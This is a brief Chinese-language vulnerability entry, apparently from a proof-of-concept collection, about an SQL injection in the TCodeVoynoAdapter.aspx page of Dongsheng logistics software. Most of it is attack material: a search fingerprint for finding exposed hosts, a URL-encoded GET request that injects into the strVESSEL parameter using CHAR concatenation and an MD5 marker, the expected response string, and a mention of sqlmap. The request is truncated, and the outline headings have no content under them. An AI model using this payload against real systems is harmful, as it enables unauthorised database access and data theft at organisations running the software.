# 东胜物流软件TCodeVoynoAdapter存在SQL注入漏洞

- **系统**：东胜物流软件　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"Z4c2hPCi5IR/AnH5vZXNSQ=="`
- **请求**：`GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1'%20AND%202523%20IN%20(SELECT%20(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT%20SUBSTRING((ISNULL(CAST((%20sys.fn_VarBinToHexStr(hashbytes('MD5','hello')))%20AS%20NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHA`

**请求体 / payload**
```
qxpqq0x5d41402abc4b2a76b9719d911017c592qzkqq
sqlmap
GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1 HTTP/1.1
Host:
```

**其他**
- 东胜物流软件TCodeVoynoAdapter存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 东胜物流软件